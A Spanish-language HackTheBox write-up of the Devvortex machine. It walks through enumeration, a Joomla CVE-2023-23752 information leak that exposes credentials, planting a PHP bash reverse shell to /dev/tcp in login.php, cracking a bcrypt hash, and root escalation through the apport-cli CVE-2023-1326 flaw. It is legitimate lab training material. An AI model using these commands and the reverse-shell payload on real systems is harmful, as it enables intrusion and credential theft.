---
title: Devvortex
date: 2024-08-30
categories: [WRITEUPS, HackTheBox]
tags: [joomla]  # TAG names should always be lowercase
image: /assets/images/hackthebox/htblogo.png
---

![picture](/assets/images/hackthebox/dev1.png)

Buenas, en esta máquina explotaremos una web con el gestor de contenido **Joomla**, gracias a la vulnerabilidad **CVE-2023-23752**, obtendremos unas credenciales del panel de administrador, y de una base de datos. Para la escalada de privilegios explotamos **CVE-2023-1326**.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que vamos a realizar es un escaneo con **NMAP**, para comprobar los puertos abiertos de la máquina.

```bash
nmap -p- --open -T5 10.10.11.242 -n -Pn -v
```

![picture](/assets/images/hackthebox/dev2.png){: w="600" h="300" }

Si intentamos introducir la dirección *IP* en el navegador, nos va a salir el siguiente mensaje.

![picture](/assets/images/hackthebox/dev3.png)

Eso es porque tenemos que añadir el dominio junto con la IP en el archivo "**/etc/hosts**" para que resuelva el nombre del dominio.

![picture](/assets/images/hackthebox/dev4.png)

Y ahora si podemos ver el contenido de la página web.

![picture](/assets/images/hackthebox/dev5.png)

Viendo la página web no encontramos nada interesante, y realizando **Fuzzing** para encontrar entradas tampoco.

Lo siguiente será realizar **Fuzzing** para buscar subdominios.

```bash
ffuf -c -H 'Host: FUZZ.devvortex.htb' -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://devvortex.htb -fc=302
```

Y nos encuentra el subdominio "**dev**".

![picture](/assets/images/hackthebox/dev6.png)

A continuación, lo añadimos al "**/etc/hosts/**" como hemos hecho antes.

![picture](/assets/images/hackthebox/dev7.png)

Y comprobamos el contenido dominio, como podemos ver es otra página.

![picture](/assets/images/hackthebox/dev8.png)

Realizando **Fuzzing** con **Gobuster**, encontramos lo siguiente.

```bash
gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.sh,.txt,.md,.png,.jpg -b 403,404
```

![picture](/assets/images/hackthebox/dev9.png)

Si leemos el archivo "**robots.txt**" encontramos que el gestor de contenido que está corriendo por detrás es un **Joomla**.

![picture](/assets/images/hackthebox/dev10.png)

Si vemos el archivo "**README.txt**" encontramos la versión de **Joomla**.

![picture](/assets/images/hackthebox/dev11.png)

El la ruta "**/administrator**" encontramos el panel de login de **Joomla**.

![picture](/assets/images/hackthebox/dev12.png)

---

## **Explotación**

Buscando por internet si la versión de **Joomla** es vulnerable, encontramos [**CVE-2023-23752**](https://github.com/Acceis/exploit-CVE-2023-23752) por el cual podemos listar información privilegiada.

Mirando el script, vemos que lanza peticiones a la siguiente **URL**.

![picture](/assets/images/hackthebox/dev13.png)

A continuación, vamos a enviar una petición con **CURL** al dominio junto a la **URL**, para ver que nos muestra.

```bash
curl -s -X GET 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true'
```

![picture](/assets/images/hackthebox/dev14.png)

Para verlo en un mejor formato añadimos lo siguiente.

```bash
curl -s -X GET 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq
```

Y encontramos un usuario, una contraseña y una base de datos.

![picture](/assets/images/hackthebox/dev15.png)

Con las credenciales encontradas vamos a probar a entrar en el panel de **Joomla**.

Y obtenemos acceso.

![picture](/assets/images/hackthebox/dev16.png)

A continuación, la idea es introducir en el archivo "**login.php**", una **Reverse Shell** para poder obtener una *Shell interactiva* en nuestra máquina local.

```php
system("/bin/bash -c 'bash -i > /dev/tcp/'Nuestra IP'/4444 0>&1'");
```

![picture](/assets/images/hackthebox/dev17.png)

Antes de guardar, tendremos que ponernos en escucha con un **Listener**.

```bash
nc -nlvp 4444
```

Y obtendremos acceso a la máquina como el usuario *www-data*.

![picture](/assets/images/hackthebox/dev18.png)

---

## **Escalada de privilegios**

Probando a entrar con el usuario y contraseña de **Lewis** en la base de datos encontrada antes, obtenemos acceso.

![picture](/assets/images/hackthebox/dev19.png){: w="600" h="300" }

Mostrando las bases de datos, nos metemos en la de **joomla**.

![picture](/assets/images/hackthebox/dev20.png){: w="600" h="300" }

Y mostrando las tablas existentes en la base de datos, seleccionamos el usuario y la contraseña de la tabla ***sd4fg_users***.

![picture](/assets/images/hackthebox/dev21.png){: w="600" h="300" }

Con la herramienta **hashid** vemos que el encriptado es **bcrypt**.

A continuación, creamos un archivo con la contraseña de **Logan** cifrada dentro, y vamos a intentar crackearla con **hashcat**.

```bash
hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

Y nos encuentra la contraseña en el diccionario.

![picture](/assets/images/hackthebox/dev22.png){: w="600" h="300" }

Intentamos migrar de usuario a **Logan**, y obtenemos acceso.

![picture](/assets/images/hackthebox/dev23.png)

En su carpeta personal encontramos la primera **flag**.

![picture](/assets/images/hackthebox/dev24.png){: w="400" h="250" }

Listando los permisos de **SUDO** del usuario encontramos el siguiente.

**Apport** se encarga de recopilar informes de errores para depuración.

![picture](/assets/images/hackthebox/dev25.png)

Buscando en internet encuentro la vulnerabilidad [**CVE-2023-1326**](https://github.com/diego-tella/CVE-2023-1326-PoC), que nos permite obtener una Shell como **root**.

Para ello tendremos que crear un archivo "**.crash**" introduciendo lo siguiente, y ejecutarlo como nos dice el repositorio de Github.

```bash
echo 'ProblemType: hola' > report.crash
```

![picture](/assets/images/hackthebox/dev26.png){: w="500" h="200" }

Cuando pulsemos la **V** tendremos que escribir "***!/bin/bash***".

![picture](/assets/images/hackthebox/dev27.png){: w="500" h="200" }

Y obtendremos la **shell** como **root**, en su directorio personal encontramos la segunda **flag**.

![picture](/assets/images/hackthebox/dev28.png)

![picture](/assets/images/hackthebox/dev29.png){: w="600" h="300" }